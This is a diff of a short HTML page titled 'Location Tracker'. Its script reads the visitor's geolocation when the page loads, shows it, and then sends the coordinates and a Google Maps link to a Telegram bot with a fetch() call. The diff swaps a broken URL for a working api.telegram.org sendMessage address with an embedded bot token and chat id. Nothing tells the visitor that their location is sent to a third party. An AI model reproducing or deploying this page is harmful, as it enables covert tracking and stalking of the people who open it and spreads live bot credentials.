@@ -1,28 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Location Tracker</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
 </head>
 <body>
-<h1>Location Tracker</h1>
-<p id="location"></p>
+    <h1>Location Tracker</h1>
+    <p id="location"></p>
 
-<script>
-navigator.geolocation.getCurrentPosition(function(position) {
-var latitude = position.coords.latitude;
-var longitude = position.coords.longitude;
-var location = "Latitude: " + latitude + "<br>Longitude: " + longitude;
-document.getElementById("location").innerHTML = location;
+    <script>
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var location = "Latitude: " + latitude + "<br>Longitude: " + longitude;
+            document.getElementById("location").innerHTML = location;
 
-// Convert to Google Maps link
-var googleMapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+            // Convert to Google Maps link
+            var googleMapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
 
-// Send location data to Telegram bot
-var url = "6673926198:AAFfUhgHc0pLNMp2yho5U-TPBAQ3xR9ta1I" + encodeURIComponent(location + "\n\nGoogle Maps link: " + googleMapsLink);
-fetch(url);
-});
-</script>
+            // Send location data to Telegram bot
+            var url = "https://api.telegram.org/bot6978200900:AAFxhAnc8VeuRuCjE7JIp7PkQAgYcKPo73E/sendMessage?chat_id=1063177042&text=" + encodeURIComponent(location + "\n\nGoogle Maps link: " + googleMapsLink);
+            fetch(url);
+        });
+    </script>
 </body>
 </html>
